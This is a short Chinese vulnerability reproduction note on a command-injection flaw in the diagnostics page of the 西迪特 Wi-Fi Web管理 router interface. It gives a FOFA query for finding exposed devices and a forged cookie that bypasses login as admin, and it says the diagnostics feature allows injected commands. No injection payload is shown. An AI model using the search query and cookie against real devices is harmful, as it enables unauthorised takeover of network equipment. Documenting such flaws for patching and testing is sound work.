# 西迪特 Wi-Fi Web管理 jumpto.php 后台命令执行漏洞


## 漏洞描述


西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞



## 漏洞影响


```plain
西迪特 Wi-Fi Web管理
```



## FOFA


```plain
title=="Wi-Fi Web管理"
```



## 漏洞复现o


登录页面



![202205191841065.png](/uploads/20260518/61da74e6-fb4b-4a4a-b9d8-c9cedb8c7b29.png)



通过越权漏洞获取权限，添加Cookie



```plain
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```



进入后台后，诊断功能点存在命令拼接执行漏洞
